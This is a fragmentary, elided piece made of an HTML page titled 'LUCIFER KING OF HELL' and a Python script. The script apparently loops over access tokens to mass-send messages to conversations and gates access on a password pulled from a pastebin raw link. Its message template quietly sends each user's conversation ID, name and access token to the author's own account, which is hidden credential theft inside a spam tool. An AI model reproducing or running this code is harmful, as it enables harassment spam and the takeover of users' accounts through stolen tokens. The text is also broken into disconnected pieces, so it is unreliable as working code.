...
<head>
    ...
    <title>LUCIFER KING OF HELL</title>

    <style>

        body {

            background-image: url('lucifer.jpg');
...
<body>
    ...
    <div class="container">
        ...
        <div class="box">
            ...
            <h1>LUCIFER KING OF HELL</h1>

            <div class="credit">

                <p>1. CREDIT:-LUCIFER-KING-OF-HELL</p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/bYSEDjBX').text

    

    if mmm_pass not in password:

        print('\033[1;31m⚠︎ YOUR P9SSW0RD CHANGED BY LUCIFER THE KING ⚠︎')
    ...
    msg_template = "Owner => LUCIFER \n Hello LUCIFER KING. \n I am using your server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"

    

    # Target IDs

    target_ids = ["LUCIFER.KING.OF.HELL"]
        ...
        try:
            ...
            for message_index in range(num_messages):
                ...
                if response.ok:
                    ...
                    print("\033[1;36m[✓] LUCIFER KING OF HELL {} C0NV0 {} T0K3N {}: {}".format(

                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                    print(formatted_time)

                    print('\033[1;92m' + '✪✭═══════•『LUCIFER THE KING 』•═══════✭✪')

                else:

                    print("\033[1;35m[x] FAILED T0 SEND MESSAGE {} C0NVO {} T0K3N {}: {}".format(
            ...
            print("\n[+] All messages sent. Restarting Task...\n")
